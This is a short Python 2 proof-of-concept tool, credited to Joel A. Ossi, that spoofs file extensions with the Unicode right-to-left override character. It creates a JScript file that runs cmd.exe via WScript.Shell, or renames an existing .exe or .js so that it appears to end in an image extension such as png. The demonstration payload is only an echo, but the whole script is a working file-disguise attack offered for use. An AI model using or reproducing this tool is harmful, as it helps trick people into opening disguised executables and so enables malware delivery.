#!/usr/bin/env python
# -*- coding: utf-8 -*-
# PoC By: Joel A. Ossi

import os

print('############################################')
print('## Right-To-Left-Override File Generator  ##')
print('##     Unicode File Extention Spoofer     ##')
print('############################################')
print('')
print('Note: this script needs Administrator privilidges.')

exploit = u"‮"

def creator():
    spoof = raw_input('ENTER EXTENTION TO SPOOF (Example: png): ')[::-1]
    filename = raw_input('ENTER ORIGINAL FILE NAME (Example: test): ')
    extention = raw_input('ENTER ORIGINAL FILE EXTENTION (Example: .js): ')
    exploit = u"‮"
    file = open(filename + exploit + spoof + extention, 'w')
    file.write("var run=new ActiveXObject('WSCRIPT.Shell').Run('cmd.exe /k echo RTLO ATTACK PoC');")
    file.close()
    print('[+] Build Saved.')
    print('')
    raw_input('PRESS ENTER KEY TO CONTINIUE')

def editor():
    path = raw_input("LOCATION OF FILE WITH NAME WITHOUT EXTENTION (Example: C:/users/test/file): ")
    spoofer = raw_input("EXTENTION TO SPOOF (Example: png): ")[::-1]
    ext = raw_input("ORIGINAL FILE EXTENTION (Example: .exe): ")
    os.rename(path + ext, path + exploit + spoofer + ext)
    print('[+] File RTLO-Spoofed')

print('1. Create new file\n'
                    '2. Spoof existing file\n')
print("")
options = raw_input('Select your choice: ')
print("")

if options == '1':
    creator()
elif options == '2':
    editor()
else:
    print("Invalid Choice.")

raw_input("PRESS ANY BUTTON TO CONTINIUE")
